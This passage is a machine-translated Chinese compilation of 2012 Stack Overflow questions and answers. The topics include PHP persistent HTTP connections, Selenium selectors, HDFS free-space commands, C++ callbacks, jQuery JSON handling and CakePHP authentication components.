        $qry_header .= "Accept: */*\r\n";           //google check the 3 "Accept"
        $qry_header .= "Accept-Language: *\r\n";
        $qry_header .= "Accept-Encoding: *\r\n";
        $qry_header .= "Connection: Close\r\n\r\n";
        fwrite( $con, $qry_header );

        while (!feof( $con ))
        {
            $line = fgets( $con );
            if (!$inheader)
            {
                $data[$key] .= $line;
                continue;
            }
            if ($line == "\n" || $line == "\r\n")
            {
                $inheader = False;
                continue;
            }
            $resp_head[$key][] = trim($line);
        }
    }
    fclose( $con );
    return $data;
} 
```

新脚本（21-07-12 12:34）：

```
function fetch( $server, $urls, $port = 80, &$resp_head )
{
    if ( !$con = @pfsockopen($server, $port, $error_number, $error_string, 30) ) return False;
    stream_set_timeout( $con, 8600 );

    $resp_head = array();
    $data = '';
    $i = count($urls);
    foreach ($urls as $key => $url )
    {
        $i--;

        // Reguest
        $qry_header = 'GET '.$url." HTTP/1.1\r\n";
        $qry_header .= 'Host: '.$server."\r\n";
        $qry_header .= 'User-Agent: Mihtyom; (+http://'.$_SERVER['HTTP_HOST']."/)\r\n";
        $qry_header .= "Accept: */*\r\n";
        $qry_header .= "Accept-Language: *\r\n";
        $qry_header .= "Connection: ".($i == 0 ? 'Close' : 'keep-alive')."\r\n\r\n";
        fwrite( $con, $qry_header );
    }

    while (!feof( $con ))
    {
        $line = fgets( $con );
        if ($line == "\r\n\r\n" || $line == "\n\n") break;
        $data .= $line;
    }
    fclose( $con );
    return $data;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T19:30:03.133

您`Connection: Close`在 HTTP 标头中指定，它基本上告诉服务器：“给我这个文件，然后立即关闭连接”。您实际上是在强迫连接关闭自己。

相反，您可以指定`Connection: Keep-Alive`，它（明确地）告诉服务器不要关闭 TCP 会话，以便您可以将其重用于另一个请求。

但是，服务器在任何情况下都不能接受 - 它可能会忽略您的请求并使用`Connection: Close`. 此外，连接的每一端都可以随时关闭连接和/或在（下一个）标题中告诉另一端这样做，通过`Connection: Close`。

为了正确实现，您应该指定`Connection: Close`循环处理最后一个 URL 的时间。

[在HTTP 1.1 / RFC 2068 第 14.10 节](http://www.ietf.org/rfc/rfc2068.txt)、[HTTP 1.1 / RFC 2616 第 19.6.2](http://www.ietf.org/rfc/rfc2616.txt)节中查找有关持久连接的更多详细信息。

# file-upload - Playframework - 将文件上传到 2 个不同的文件夹

> ID：11583187
> 
> 赞同：1
> 
> 时间：2012-07-20T16:15:00.950
> 
> 标签：file-upload, directory, playframework-2.0, attachment

刚开始玩，我需要看看它可以用来做我的项目。但是在阅读了一些文档之后，我仍然找不到将上传的文件放在多个地方的方法。

我知道有附件文件夹，我可以在 confs 中更改它的目录，但我想要的是另一个附件文件夹，例如：

*   如果用户上传照片，它将转到 /photos 文件夹；
*   如果用户上传一个 txt，它将转到 /docs fodler；

谢谢

--更新--我正在使用 Play 2.0.1

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-23T00:51:47.183

因此，经过更多研究后，我发现了另一个问题： [如何在 play 2.0.1 中更改上传的文件目录？](https://stackoverflow.com/questions/10955424/how-can-i-change-uploaded-files-directory-in-play-2-0-1)

在这个playframework版本中基本上没有更多的附件路径配置，所以我需要手动将它放在控件中，就像那个问题中的答案一样。

# c# - 在单独的类中将事件添加到 Silverlight 形状

> ID：11583188
> 
> 赞同：2
> 
> 时间：2012-07-20T16:15:03.600
> 
> 标签：c#, silverlight, events, silverlight-3.0

因此，一旦将形状拖放到画布上，我就会尝试创建形状的副本。我的 EventHandlers 在 MainPage.xaml.cs 上。然后我使用另一个类来处理拖放等。然后我扩展形状类以创建一个副本并返回它。一切正常，除了一旦矩形在画布上，事件就不起作用。（因为它们不是针对 xaml.cs 中的事件）我该如何解决这个问题？谢谢！

```
 // In my drag/drop class I add the control
    _cContainer.Children.Add(s.AsRectangle(_tContainer));

    // In my extension of the shape class
    public static Rectangle AsRectangle(this Shape s, Canvas c)
    {
        Rectangle r = new Rectangle() {
            Fill = s.Fill,
            Height = s.Height,
            Width = s.Width
        };
        r.MouseLeftButtonDown += new MouseButtonEventHandler(Handle_MouseDown);
        r.MouseMove += new MouseEventHandler(Handle_MouseMove);
        r.MouseLeftButtonUp += new MouseButtonEventHandler(Handle_MouseUp);
        Canvas.SetLeft(r, s.GetLeft() - c.Width);
        Canvas.SetTop(r, s.GetTop());
        return r;
    } 
```

# c# - 使用 web.config 转换在 vs2012 中进行本地部署

> ID：11583192
> 
> 赞同：2
> 
> 时间：2012-07-20T16:15:21.730
> 
> 标签：c#, asp.net, visual-studio-2012

我们的商店正在对 Visual Studio 2012 进行测试，以便我们可以在它下降后立即使用它，我的任务是逐步运行它，以确保一切都能按需要运行。到目前为止，我只发现了一个问题，那就是使用我们的 web.config 转换部署我们的解决方案，以便我可以将其传输到服务器以在我们的开发网络上使用。我们根据需要设置了不同的配置（发布、登台、开发），它们都在 VS2010 中工作，但是当我尝试像往常一样找到部署包的地方时，我在IDE。

我在网上找到了大量关于发布到服务器或使用 FTP 的文章，但在我们的环境中这是不可能的，我们必须在我们的机器上构建它，然后将它传送到运动鞋网风格（不理想但需要）到服务器我们自己。我似乎无法找到如何做到这一点。有谁知道如何做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-26T19:55:47.557

这可能不是您要查找的内容，但是您不能右键单击解决方案资源管理器中的根文件夹并选择发布网站吗？（我会简单地将其作为评论，但我没有足够的代表来做到这一点。）

* * *

[![我所看到的](../Images/f19bf9a9aec99fc4d73fcb55205fbb08.png)](https://i.stack.imgur.com/VW5Ax.png)

# winapi - _NET_WM_USER_TIME 的 Windows 模拟

> ID：11583193
> 
> 赞同：0
> 
> 时间：2012-07-20T16:15:24.390
> 
> 标签：winapi

Win32中是否有类似的`_NET_WM_USER_TIME`属性或其他方式来获取按上次使用时间排序的窗口列表？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T16:31:30.203

有 EnumWindows 调用，它在任何给定时间列出了屏幕上的所有窗口：

[http://msdn.microsoft.com/en-us/library/windows/desktop/ms633497(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms633497(v=vs.85).aspx)

其次，GetActiveWindow 将为您提供当前活动的顶级窗口，并 GetFocus 具有输入焦点的窗口：

[如何判断窗口是否有焦点？(Win32 API)](https://stackoverflow.com/questions/466354/how-can-i-tell-if-a-window-has-focus-win32-api)

没有办法从 Win32 API 获得焦点历史列表 - 这是一个非常小众的信息！- 但您可以在后台线程上运行一个进程，该线程定期迭代 EnumWindows 的结果，将句柄与 GetActiveWindow 进行比较，并随时间存储窗口和焦点状态的日志。这样，您就可以随时查询您自己的日志，而无需额外开销。

在 .NET 之前的日子里，我曾经在 Visual Basic 中做过很多相同的事情，但在任何其他可以访问 Win32 API 的环境中都应该完全有可能。

# ruby - Selenium Webdriver + Ruby 正则表达式：我可以将正则表达式与 find_element 一起使用吗？

> ID：11583197
> 
> 赞同：2
> 
> 时间：2012-07-20T16:15:35.207
> 
> 标签：ruby, regex, webdriver

我正在尝试单击每个订单都会更改的元素，如下所示

```
edit_div_123

edit_div_124

edit_div_xxx

xxx = any three numbers 
```

我试过像这样使用正则表达式：

```
@driver.find_element(:css, "#edit_order_#{\d*} > div.submit > button[name=\"commit\"]").click 

@driver.find_element(:xpath, "//*[(@id = "edit_order_#{\d*}")]//button").click 
```

这可能吗？还有其他方法吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-14T04:41:09.263

您不能像其他答案所示那样使用正则表达式。

相反，您可以使用漂亮的 CSS 选择器技巧：

```
@driver.find_element(:css, "[id^=\"edit_order_\"] > div.submit > button[name=\"commit\"]").click 
```

使用：

*   ^= 表示查找值以您的条件开头的元素。

*   *= 表示条件应该在元素值的任何地方找到

*   $= 表示在值的末尾查找带有您的条件的元素。

*   ~= 允许您在实际值具有多个以空格分隔的值列表时基于单个条件查找元素。

看看[http://net.tutsplus.com/tutorials/html-css-techniques/the-30-css-selectors-you-must-memorize/](http://net.tutsplus.com/tutorials/html-css-techniques/the-30-css-selectors-you-must-memorize/)了解更多关于你应该添加到你的 CSS 技巧的信息实用腰带！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-20T16:31:44.670

您没有提供任何正在处理的 html 片段。因此，我的回答只是基于您提供的问题所提供的有限输入。

我不认为 WebDriver API 支持正则表达式来定位元素。但是，您可以使用纯 XPath 来实现您想要的，如下所示：

```
//*[starts-with(@id, 'edit_div_')]//button 
```

**解释**：上面的 xpath 将尝试搜索属性以字符串开头的 `<button>`所有元素下存在的所有节点`id``edit_div_`

简而言之，您可以使用`starts-with()`xpath 函数来匹配具有 id 格式的元素`edit_div_ followed by any number of characters`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T16:30:41.187

你不能。

但是你应该这样做：

```
function hasClass(element, className) {
  var re = new RegExp('(?:^|\\s+)' + className + '(?:\\s+|$)');
  return re.test(element.className);
} 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2015-06-03T15:00:05.037

这对我有用

```
@driver.find_element(:xpath, "//a[contains(@href, 'person')]").click 
```

# ios - 为什么 MonoTouch 调试器会在一段时间后断开连接？

> ID：11583198
> 
> 赞同：1
> 
> 时间：2012-07-20T16:15:37.720
> 
> 标签：ios, xamarin.ios, monodevelop, soft-debugger

当我在 iPad 上调试应用程序时，通常会在一段时间后返回它时，调试会话已经停止，但应用程序仍在运行。

这非常令人沮丧，因为我专门`UIWebView`在应用程序中加入了一些调试工具，比如在滑动时重新加载外部内容，这样我每次更改时都不必重新编译它。

我查看了设置，并没有发现像“调试超时”这样的东西。怎么了？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T16:15:37.720

事实证明，问题出在自动锁定上。
它卸载应用程序，因此软调试器的连接丢失。

将自动锁定设置为 15 分钟解决了我的问题。

# jquery - 为什么我无法处理 JSON 响应？

> ID：11583200
> 
> 赞同：0
> 
> 时间：2012-07-20T16:15:47.427
> 
> 标签：jquery, ajax, json

我正在取回一些 JSON，需要在我的页面上显示它，但它似乎不会显示！

有人可以看看，看看你能不能看出我哪里出错了？

代码：

```
 $.ajax({ type: "GET",
    url: "URL GOES HERE - Cant give for obvious reasons :)",
    dataType: "jsonp",
    success: function (response) {
        var result = response.d;
        $.each(result, function (index, res) {
            $('#questions').val(res.q);

        });
    },
    error: function (msg) {

    }
}); 
```

JSON：

```
{
  "d": [
        {
            "id": "1002 ",
            "q": "What region is Auchentoshan whisky made in",
            "a1": "Highlands",
            "a2": "Speyside",
            "a3": "Lowlands"
        },
        {
            "id": "1042 ",
            "q": "Chase’s award winning vodka is made from...",
            "a1": "Grapes",
            "a2": "Rye",
            "a3": "Potatoes"
        }
    ]
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T16:21:41.857

一个响应应该是一个包裹在函数调用中的 JSON blob `dataType`。`jsonp`由于您只返回 JSON，因此您应该使用`dataType`of `json`。

我已经调整了您的示例以使用 JSFiddle echo API。在第[一个版本](http://jsfiddle.net/gtYcr/)中，我使用了您的代码中使用的`dataType`of 。`jsonp`如您访问该链接所见，它不起作用。在[编辑后的版本](http://jsfiddle.net/gtYcr/1/)中，我使用了`dataType`of`json`并且效果很好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T16:25:44.983

```
$('#questions').val(res.q); 
```

根据您要设置的内容，您可能需要使用：

```
$('#questions').html(res.q); 
```

# java - 为什么 在 Java 中导致奇怪的 indexOf() 结果？

> ID：11583201
> 
> 赞同：1
> 
> 时间：2012-07-20T16:15:48.150
> 
> 标签：java, indexof

我有一个电子邮件标题数据的平面文件，我正在尝试对其进行解析以进行分析。该文件将始终具有按以下顺序排列的字段：记录号，1 或 2 个字节，`"From:"`后跟发件人姓名，`"Sent:"`然后是发送日期。

```
1 From: Person.Name Sent: April 12, 2010
2 From:<tab>Person.Name Sent: April 30, 2011
10 From: Person.Name Sent: June 29, 2012
11 From:<tab>Person.Name Sent: July 8, 2012 
```

使用`BufferedReader`我逐行读取文件并根据`"From:"`和的索引之间的所有字符定义名称的子字符串`"Sent:"`。

```
String sender = inputLine.substring((inputLine.indexof("From:")+6),(inputLine.indexOf("Sent:")-1)); 
```

在这种情况下，我在“发件人：”（第六个字节不包括单词、冒号和冒号后的空格/单字节）之后的所有内容都比“发送：”的位置少一个（在S)。

但是，当我运行该作业时，我得到了意外的输出。我的一些输入数据后面**似乎**有一个标签，`"From: "`而有些行没有。当一个选项卡存在时，我的输出包括最后两个**或**三个字节`"From: "`（当记录号是一位数时，我得到`m:<tab>`，对于两位数的记录号，它是`om:<tab>`.

```
Person.Name
m:<tab>Person.Name        <-- single digit record number
Person.Name        
om:<tab>Person.Name       <-- double digit record number 
```

编辑：当我修改我`substring`的

```
String sender = inputLine.substring((inputLine.indexof("From:\t")+6),(inputLine.indexOf("Sent:")-1)); 
```

只有带有空格（而不是制表符）的记录`From:`在输出的末尾之前。

```
Person.Name        <-- records with From:<tab>
om: Person.Name    <-- records with From:<space> 
```

我现在想知道我是否理解`substring`正确。我上面的陈述是基于对字符串的开始和结束`substring(x,y)`位置的理解。那是对的吗？`x``y`

由于 indexOf("From:") 旨在表示 2 或 3 的整数值（取决于 1 或 2 字节的记录号，例如，`1 From:`或`10 From:`）我认为添加 6 的值会给我一个索引值落在`:`行前的 in 索引 8 或 9 之后。那么，为什么它似乎将其视为 5 的索引——不管怎样？

```
 111111111122222222222  |
 0123456789012345678901234567890  + index values
 1 From: Person.Name Sent: June
 10 From: Person.Name Sent: July 
```

制表符是记录中唯一的区别，虽然我知道制表符字符的计数可能与 ASCII 空格字符不同，但从索引中减去似乎有点奇怪。

更有趣的是，如果我从声明中删除“调整”，

```
 String sender = inputLine.substring((inputLine.indexof("From:")),(inputLine.indexOf("Sent:"))); 
```

我得到一个`-1 out of range`例外。

有人可以解释一下这里发生了什么吗？我很困惑，在 oracle 的 java 文档中找不到这个特定的答案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T19:42:41.543

我最终创建了用空格替换 \t 的新输入字段。然后一切正常。关于标签字符的什么东西扔掉了仍然是一个谜。

# c++ - c ++：当回调不提供用户arg时如何获取上下文？

> ID：11583205
> 
> 赞同：5
> 
> 时间：2012-07-20T16:16:02.400
> 
> 标签：c++, callback, scope

首先，一些背景：（
注意：虽然我在非 .NET Win32 领域，但这确实是一个 C++ 问题）

我正在使用第 3 方 API，它要求您注册回调函数才能知道异步操作何时完成。必须使用回调，没有办法。

非 OOP 实现将是这样的：

```
void __stdcall MyCbFcn(int value)
{
   do something with 'value'...
}

API_RegisterCallback(MyCbFcn); 
```

很标准的东西。

但是...
我的代码是 OOP，有多个实例 rx'ing 回调，因此回调需要路由到注册它的对象。

知道人们会这样做，回调通常包括一个用户变量，例如：

```
void __stdcall MyCbFcn(int value, U32 user)
{
   do something with 'value'...
}

API_RegisterCallback(MyCbFcn, someUserValue); 
```

更具体地说，当与 OOP 结合使用时，此用户 arg 允许您返回上下文：（
为简洁起见，内联编写）：

```
class MyClass
{
public:
   MyClass()
   {
      API_RegisterCallback(MyClass::StaticCbFcn, (U32)this);
   }

private:
   static void __stdcall StaticCbFcn(int value, U32 user)
   {
      MyClass* pThis = (MyClass*)user;
      pThis->InstanceCbFcn(value);
   }
   void InstanceCbFcn(int value)
   {
      ... do some work in context ...
   }
} 
```

但是，我的 API 没有用户 arg :(

所以现在我的问题是：
我如何才能回到上下文中？

我考虑过一些粗略的事情，比如定义一个包含 100 个不同回调的“池”并将它们分配为创建对象，但这似乎是一个真正的 hack。

一个明显的解决方案......如果我在例如 JavaScript :) ... 将使用匿名函数，但 AFAIK C++ 没有类似的东西。

任何想法，将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T16:22:58.323

"100 distinct callbacks" is really the only thing you can do, thus you use the function address as identifying parameter. It might help to implement the different functions as template with a constant parameter:

```
template < unsinged N >
void StaticCbFcn( int value )
{
    map[ N ].InstanceCbFcn( value );
} 
```

# hadoop - HDFS 可用空间可用命令

> ID：11583210
> 
> 赞同：64
> 
> 时间：2012-07-20T16:16:11.247
> 
> 标签：hadoop, hdfs

是否有 hdfs 命令可以查看 hdfs 中的可用空间。我们可以通过浏览器中的 master:hdfsport 中的浏览器看到这一点，但由于某种原因，我无法访问它，我需要一些命令。我可以通过命令 ./bin/hadoop fs -du -h 查看我的磁盘使用情况，但看不到可用空间。

感谢您提前回答。

* * *

## 回答 #1

> 赞同：96
> 
> 时间：2012-07-20T16:42:09.230

试试这个：

```
hdfs dfsadmin -report 
```

对于旧版本的 Hadoop，试试这个：

```
hadoop dfsadmin -report 
```

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2016-02-04T18:38:49.637

### 方法

**1.dfsadmin**

在较新版本的 HDFS 中，不推荐使用 dfsadmin 的 hadoop CLI：

```
$ sudo -u hdfs hadoop dfsadmin -report
DEPRECATED: Use of this script to execute hdfs command is deprecated.
Instead use the hdfs command for it. 
```

所以你应该只`hdfs`在这一点上使用。此外，在`sudo`需要的系统上，您可以像这样运行它：

```
$ sudo -u hdfs hdfs dfsadmin -report 
```

**2\. fs -df**

您还可以通过`fs`模块使用其他方法`hadoop`：

```
$ hadoop fs -df -h 
```

### 示例输出

**管理员**

此外，为了提供更全面的答案，这里是单节点安装的输出。

```
$ sudo -u hdfs hdfs dfsadmin -report
Configured Capacity: 7504658432 (6.99 GB)
Present Capacity: 527142912 (502.72 MB)
DFS Remaining: 36921344 (35.21 MB)
DFS Used: 490221568 (467.51 MB)
DFS Used%: 93.00%
Under replicated blocks: 128
Blocks with corrupt replicas: 0
Missing blocks: 0
Missing blocks (with replication factor 1): 0

-------------------------------------------------
Live datanodes (1):

Name: 192.168.114.48:50010 (host-192-168-114-48.td.local)
Hostname: host-192-168-114-48.td.local
Decommission Status : Normal
Configured Capacity: 7504658432 (6.99 GB)
DFS Used: 490221568 (467.51 MB)
Non DFS Used: 6977515520 (6.50 GB)
DFS Remaining: 36921344 (35.21 MB)
DFS Used%: 6.53%
DFS Remaining%: 0.49%
Configured Cache Capacity: 0 (0 B)
Cache Used: 0 (0 B)
Cache Remaining: 0 (0 B)
Cache Used%: 100.00%
Cache Remaining%: 0.00%
Xceivers: 2
Last contact: Thu Feb 04 13:35:04 EST 2016 
```

在上面的示例中，HDFS 硬盘空间已被 100% 使用。

**fs -df**

`-df`与模块中的子命令相同的系统`fs`：

```
$ hadoop fs -df -h
Filesystem                                 Size     Used  Available  Use%
hdfs://host-192-168-114-48.td.local:8020  7.0 G  467.5 M     18.3 M    7% 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2016-09-04T10:05:16.890

## Hadoop版本1：

```
hadoop fs -df -h 
```

或者

```
hadoop dfsadmin -report 
```

* * *

## Hadoop 版本 2：

```
hdfs dfs -df -h 
```

或者

```
hadoop dfsadmin -report 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-01-25T12:57:23.617

试试这个命令：

```
hdfs dfsadmin -report 
```

# perl - 如何在 Perl 中检索所需键的值

> ID：11583211
> 
> 赞同：-7
> 
> 时间：2012-07-20T16:16:14.687
> 
> 标签：perl

我有一个带有键和值的哈希。如何检索所需键的值？

```
%a = qw(genea brain geneb heart genec kidney gened eye); 
```

现在我想检索键`genec`和`gened`. 我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T18:21:16.630

要一次获取多个键的值列表，请使用哈希切片：

```
@lots_of_values = @hash{ @lots_of_keys }; 
```

因为结果是一个列表，所以`@`即使它是一个散列，你也可以使用印记；这些值将是指定键的顺序，包括散列中不存在指定键的 undef 值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T16:32:09.600

听起来您要问的只是如何访问哈希的元素。正如 Quentin 所指出的，这在谷歌上是微不足道的。

perldata文档涵盖了基本问题，而[perlfaq4](http://perldoc.perl.org/perlfaq4.html#Data%3a-Hashes-%28Associative-Arrays%29)[涵盖](http://perldoc.perl.org/perldata.html)了许多其他哈希问题。

也就是说，回答你的问题：

```
print $a{'genec'};
print $a{'gened'}; 
```

我也不会以这种方式声明您的哈希，因为不清楚什么是键，什么是值。相反，请考虑：

```
my %a = ('genea' => 'brain', 'geneb' => 'heart'); # etc. 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T16:29:54.917

```
 $GENEC = $a{genec};
 $GENED = $a{gened}; 
```

请给自己一份学习 Perl 的副本。你会很高兴你做到了。

# java - 如何检查 Java 对象是否为字符串？

> ID：11583217
> 
> 赞同：-2
> 
> 时间：2012-07-20T16:16:30.527
> 
> 标签：java, string, object

如何检查对象是否为字符串类型？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-20T16:17:24.913

```
if(object instanceof String)
{
    // Do Stuff
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-20T16:18:22.393

像这样：

```
Integer myInt = 3;
if (myInt instanceof String)
    System.out.println("It's a String!");
else
    System.out.println("Not a String :("); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-07-20T16:20:13.523

通过`instanceof`在java中使用运算符：

```
if(object instanceof String){
    System.out.println("String object");
    // continue your code here
}
else{
     System.out.println("it is not a String");
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-20T16:18:13.630

```
 if( obj instanceof String ) {} 
```

是一种检查你得到的对象是否属于 String 的方法

# jquery - jQuery隐藏滚动到页面顶部

> ID：11583219
> 
> 赞同：0
> 
> 时间：2012-07-20T16:16:41.277
> 
> 标签：jquery

当我在一个 div 上调用 .hide 然后在另一个 div 上调用 .show 来替换最后一个时，页面会滚动到顶部。这些调用由计时器触发。知道如何防止页面滚动到顶部吗？

# google-apps-script - 致 GAS 支持团队。是否有计划引入代码分析器？

> ID：11583224
> 
> 赞同：0
> 
> 时间：2012-07-20T16:17:12.603
> 
> 标签：google-apps-script

问题在标题中。至少它会是一个非常方便的功能，让一个函数返回一个毫秒计数器（类似于 Windows`GetTickCount`函数）来估计哪个代码最慢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T19:39:42.250

[请在问题跟踪器](https://code.google.com/p/google-apps-script-issues/issues/list)中提出对此类功能的请求。这将帮助我们跟踪对不同功能请求的需求。

# c# - 用于桌面应用程序的机器特定安全本地存储

> ID：11583227
> 
> 赞同：0
> 
> 时间：2012-07-20T16:17:19.407
> 
> 标签：c#, .net, wpf

我需要使用 WPF 创建的桌面应用程序的特定于机器的安全本地存储。我认为 SQL Server CE 是一种解决方案，但可能有人知道更好的方法来实现我需要的功能。有什么建议或意见吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T16:39:20.520

您可以使用 pinvoke 和**[CryptProtectData/CryptUnprotectData](http://msdn.microsoft.com/en-us/library/windows/desktop/aa380261%28v=vs.85%29.aspx)**加密/解密并将其存储在任何地方。通过选择合适的选项，数据无法成功锁定到特定的机器/计算机组合。

CryptProtectData 函数对 DATA_BLOB 结构中的数据执行加密。通常，只有与加密数据的用户具有相同登录凭据的用户才能解密数据。此外，加密和解密通常必须在同一台计算机上完成。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T16:44:45.857

SQLite 呢？Firefox 等应用程序使用它。不太熟悉 SQlite 中的安全标准，但我很确定它具有此功能。 [SQLite 连接字符串](http://www.connectionstrings.com/sqlite)及其 [官网](http://www.sqlite.org/)

# javascript - IE 8 Script438 错误

> ID：11583229
> 
> 赞同：0
> 
> 时间：2012-07-20T16:17:22.440
> 
> 标签：javascript, html, internet-explorer-8, swfobject

Internet Explorer 8 再次...

我一直在寻找解决我的 SCRIPT438 错误（SCRIPT438：对象不支持此属性或方法）的解决方案，但它们似乎都不适合我。

我正在使用 swfobject.js，F12 控制台上的错误报告显示第 435 行字符 5 存在错误，这一行：

```
el.outerHTML = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"' + att + '>' + par + '</object>'; 
```

该行是此功能的一部分：

```
function createSWF(attObj, parObj, id) {
    var r, el = getElementById(id);
    if (ua.wk && ua.wk < 312) { return r; }
    if (el) {
    if (typeof attObj.id == UNDEF) { // if no 'id' is defined for the object element, it will inherit the 'id' from the alternative content
        attObj.id = id;
    }
    if (ua.ie && ua.win) { // Internet Explorer + the HTML object element + W3C DOM methods do not combine: fall back to outerHTML
        var att = "";
        for (var i in attObj) {
            if (attObj[i] != Object.prototype[i]) { // filter out prototype additions from other potential libraries
                if (i.toLowerCase() == "data") {
                    parObj.movie = attObj[i];
                }
                else if (i.toLowerCase() == "styleclass") { // 'class' is an ECMA4 reserved keyword
                    att += ' class="' + attObj[i] + '"';
                }
                else if (i.toLowerCase() != "classid") {
                    att += ' ' + i + '="' + attObj[i] + '"';
                }
            }
        }
        var par = "";
        for (var j in parObj) {
            if (parObj[j] != Object.prototype[j]) { // filter out prototype additions from other potential libraries
                par += '<param name="' + j + '" value="' + parObj[j] + '" />';
            }
        }
        el.outerHTML = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"' + att + '>' + par + '</object>';
        objIdArr[objIdArr.length] = attObj.id; // stored to fix object 'leaks' on unload (dynamic publishing only)
        r = getElementById(attObj.id);  
    } 
```

所以'el'不应该是不确定的

这就是我将所有 javascript 添加到 HTML 的方式

```
<script src="http://code.jquery.com/jquery-1.7.2.min.js"></script>

<script src="js/smoothscroll.js"></script>
<script src="js/jquery.placeholder.min.js"></script>
<script src="js/javascript.js"></script>
<script src="js/swfobject.js"></script>
<script src="js/player.js"></script> 
```

我没有两次包含 jquery，jquery.placeholder 是我用来解决源代码中 ie9 占位符问题的插件，可以在这里找到 [https://github.com/mathiasbynens/jquery-placeholder](https://github.com/mathiasbynens/jquery-placeholder)

我必须解决这个直到星期一，真的可以使用一些帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2019-10-25T18:14:41.603

在实际意义上，如果您为您的项目使用编译，您可能会考虑安装 polyfill 包

```
npm i --save core-js 
```

或者

```
yarn add core-js 
```

然后在项目入口点的顶部添加

```
import 'core-js' 
```

目前[core-js polyfill 库](https://www.npmjs.com/package/core-js)是实现跨浏览器支持的最简单方法

# cuda - 关于每个块的线程的 CUDA 性能

> ID：11583230
> 
> 赞同：2
> 
> 时间：2012-07-20T16:17:23.143
> 
> 标签：cuda

我正在尝试使用 CUDA 来获取兴趣。在其中一个实验中，我有一个小内核，它只在 for 循环中运行了 1000 万次。我发送 1 个块，然后将每个块的线程数从 1 增加到 1024。然后我绘制了执行以查看它是如何变化的。结果是在每块大约 350 个线程处急剧上升，然后在逐渐的时刻急剧上升。执行时间变为每块 1024 个线程时的 2 倍，表明至少有一个线程已被阻塞。实际的图表就像一个递增的阶梯。我想了解的是这些上升的原因和数量取决于。我试图了解它与 SM、cuda 核心等的数量有关。

我正在使用 GeForce 560 Ti 和 8SM，每个 SM 48 核和每个 SM 2 个 warp 调度程序。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T17:03:55.200

每个块 350 个线程急剧增加的一个可能原因是该块消耗了太多资源，以至于 SM 一次不能处理多个块。您可以使用 CUDA 占用计算器根据内核的资源使用情况查看一个 SM 一次将处理多少块。

# cakephp - 自定义身份验证对象中的自定义组件

> ID：11583234
> 
> 赞同：1
> 
> 时间：2012-07-20T16:17:29.290
> 
> 标签：cakephp

如何`Session`在自定义身份验证对象中使用组件（自定义或类似基础的）？（位于`Controller/Components/Auth`）？？

我试过`public $components = array('Session', 'name of my custom component');`了，但它不起作用。

谢谢...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-17T00:50:53.840

由于我自己正在寻找一种方法来做到这一点，并且我发现有人问了这个问题，所以我将分享我的发现。

我看了一下 BaseAuthenticate::__construct() ，似乎 AuthComponent 将控制器的 ComponentCollection 发送到每个 Autehntication 对象。我试着做

```
$this->Session = $this->_Collection->__get('Session');
$this->Session->write('foo', 'bar'); 
```

它起作用了，但这只是因为我已经在我的 AppController 中加载了 SessionComponent。ComponentCollection::__get() 只返回加载的组件。您可能想查看 ComponentCollection 类及其父类 ObjectCollection，以了解有关如何使用组件的更多详细信息。

这就是我在 Authentication 类中所做的：

```
/**
 * Constructor
 *
 * @param ComponentCollection $collection The Component collection used on this request.
 * @param array $settings Array of settings to use.
 */
public function __construct(ComponentCollection $collection, $settings) {
    $settings = array_merge($this->settings, $settings);
    parent::__construct($collection, $settings);
    $this->http = new HttpSocket();
    $this->_initComponentCollection();
}

/**
 * Initializes all the loaded Components for the Authentication Object.
 * Attaches a reference of each component to the Authentication Object.
 *
 * @return void
 */
protected function _initComponentCollection() {
    $components = $this->_Collection->loaded();
    if (!empty($components)) {
        foreach ($components as $name) {
            $this->{$name} = $this->_Collection->__get($name);
        }
    }
} 
```

这仅使用已加载的组件，因为我不想加载所有组件。我将使用 cakephp 打开一张票，看看是否可以将类似的片段添加到 BaseAuthenticate 类。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-26T19:03:40.127

根据蛋糕书：

```
// Pass settings in $components array
public $components = array(
    'Auth' => array(
        'authenticate' => array(
            'name of custom authentication object'
        )
    )
); 
```

Auth 组件的 authenticate 属性是您声明将使用的身份验证对象的位置，无论是表单、基本、摘要还是自定义对象。

# internet-explorer - IE 只看到 nginx 中配置的第一个 ssl 证书

> ID：11583246
> 
> 赞同：1
> 
> 时间：2012-07-20T16:18:16.050
> 
> 标签：internet-explorer, ssl, nginx

我在 nginx 下有一个以这种方式配置的站点（一个 IP 上的两个域）：

```
server {
  listen   443;

  ssl on;
  ssl_certificate /etc/ssl/certs/oldsite.com.pem;
  ssl_certificate_key /etc/ssl/private/oldsite.com.ca.key;

